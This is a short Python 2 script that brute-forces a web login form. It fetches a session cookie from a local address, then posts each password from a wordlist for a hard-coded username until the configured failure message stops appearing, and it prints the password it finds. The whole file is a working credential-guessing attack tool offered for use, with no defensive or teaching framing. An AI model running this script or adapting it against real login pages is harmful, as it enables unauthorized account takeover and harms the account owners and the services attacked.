import requests

#change post or get if get or post
#change username:name password:name and other param:name
class bc:
    OKGREEN = '\033[92m'
    RED = '\033[91m'
    BOLD = '\033[1m'


#cookies
s=requests.Session();c=s.get("http://10.0.2.2");ck=dict(c.cookies);cc = ck['_usse']

url = raw_input("\nUrl post: ")+"?gfd="+cc
ter = raw_input("Invalid login response: ")
pwls = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt";psf = open(pwls, "r").readlines()

print("\n")
for j in psf:
 jb=j.strip()
 http = requests.post(url, data={"lo_password":jb,"lo_name":"toballz","lo_auth":cc},cookies=ck)
 con = http.content
 if ter not in con:
  print bc.OKGREEN,bc.BOLD+("\n [*+*] Correct password: "+jb+">>>>>>>>>>>>>>>>>.\n")
  break;
 else:
  print("[!!!] invalid password: "+jb)
